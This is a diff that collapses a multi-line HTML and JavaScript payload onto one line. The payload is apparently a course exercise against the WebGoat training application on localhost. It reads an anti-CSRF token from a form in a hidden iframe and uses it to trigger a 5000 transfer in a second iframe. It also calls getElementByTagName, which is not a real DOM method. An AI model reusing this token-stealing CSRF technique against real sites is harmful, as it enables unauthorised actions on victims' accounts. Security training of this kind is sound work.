@@ -1,11 +1,1 @@
-<script>
-    function hackToken() {
-	var token = document.getElementById("iframe1_ece568").contentDocument.getElementByTagName("form")[0].token.value;
-	var url = "http://localhost:8090/WebGoat/attack?Screen=605842438&menu=900&transfer=5000&token=" + token;
-	document.getElementById("iframe2_ece568").src = url;
-    }	
-</script>
-
-<iframe id="iframe1_ece568" src="attack?Screen=605842438&menu=900&transfer=main" onload="hackToken()"></iframe>
-
-<iframe id="iframe2_ece568"></iframe>
+<script> function hackToken() {var token = document.getElementById("iframe1_ece568").contentDocument.getElementByTagName("form")[0].token.value; var url = "http://localhost:8090/WebGoat/attack?Screen=605842438&menu=900&transfer=5000&token=" + token; document.getElementById("iframe2_ece568").src = url;}	</script><iframe id="iframe1_ece568" src="attack?Screen=605842438&menu=900&transfer=main" onload="hackToken()"></iframe><iframe id="iframe2_ece568"></iframe>
